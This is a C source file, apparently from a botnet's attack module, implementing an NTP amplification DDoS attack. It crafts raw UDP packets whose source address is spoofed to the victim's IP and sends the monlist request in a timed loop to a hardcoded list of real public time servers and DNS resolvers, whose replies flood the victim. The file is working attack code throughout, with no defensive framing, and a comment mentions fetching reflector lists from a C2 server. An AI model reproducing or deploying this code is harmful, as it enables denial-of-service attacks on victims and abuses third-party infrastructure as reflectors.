#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <time.h>

#include "attack.h"

// Standard monlist payload (old but classic)
static const uint8_t ntp_monlist[] = {
    0x17, 0x00, 0x03, 0x2a, 0x00, 0x00, 0x00, 0x00
};

// Hardcoded Reflector List (Public Time Servers)
// In a real weaponized bot, this comes from a C2 list update.
static const char *reflectors[] = {
    "132.163.4.101", // NIST
    "132.163.4.102", // NIST
    "132.163.4.103", // NIST
    "129.6.15.28",   // NIST
    "162.159.200.1", // pool.ntp.org
    "162.159.200.123",
    "216.239.35.0",  // time1.google.com
    "216.239.35.4",  // time2.google.com
    "208.67.222.222" // OpenDNS
};

void attack_ntp(uint32_t victim_ip, uint16_t victim_port, uint32_t duration) {
    (void)victim_port; // Amplification targets the IP, port 80/443 etc doesn't matter for the *response* usually

    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
    if (sock < 0) return;

    int one = 1;
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));

    char packet[1024];
    struct ip *iph = (struct ip *)packet;
    struct udphdr *udph = (struct udphdr *)(packet + sizeof(struct ip));

    time_t end_time = time(NULL) + duration;
    int num_reflectors = sizeof(reflectors) / sizeof(char*);

    // Initial Header Setup
    iph->ip_hl = 5;
    iph->ip_v = 4;
    iph->ip_tos = 0;
    iph->ip_len = sizeof(struct ip) + sizeof(struct udphdr) + sizeof(ntp_monlist);
    iph->ip_id = htonl(54321);
    iph->ip_off = 0;
    iph->ip_ttl = 255;
    iph->ip_p = IPPROTO_UDP;
    
    // SOURCE IS VICTIM (Spoofed)
    iph->ip_src.s_addr = victim_ip; 

    struct sockaddr_in current_reflector;
    current_reflector.sin_family = AF_INET;
    current_reflector.sin_port = htons(123); // NTP Port

    while (time(NULL) < end_time) {
        // Round Robin through Reflectors
        for (int i = 0; i < num_reflectors; i++) {
            current_reflector.sin_addr.s_addr = inet_addr(reflectors[i]);
            iph->ip_dst.s_addr = current_reflector.sin_addr.s_addr;

            iph->ip_id = htonl(fast_rand() & 0xFFFF);
            iph->ip_sum = 0; 
            iph->ip_sum = csum((unsigned short *)packet, sizeof(struct ip));

            udph->uh_sport = htons(fast_rand() & 0xFFFF); // Random source port on victim? 
            // Better: If victim is a server, target common ports? No, random is fine for bandwidth saturation.
            udph->uh_dport = htons(123);
            udph->uh_ulen = htons(sizeof(struct udphdr) + sizeof(ntp_monlist));
            udph->uh_sum = 0; 

            // Copy Payload
            uint8_t *data = (uint8_t *)(packet + sizeof(struct ip) + sizeof(struct udphdr));
            memcpy(data, ntp_monlist, sizeof(ntp_monlist));

            sendto(sock, packet, iph->ip_len, 0, (struct sockaddr *)&current_reflector, sizeof(current_reflector));
        }
    }
    close(sock);
}
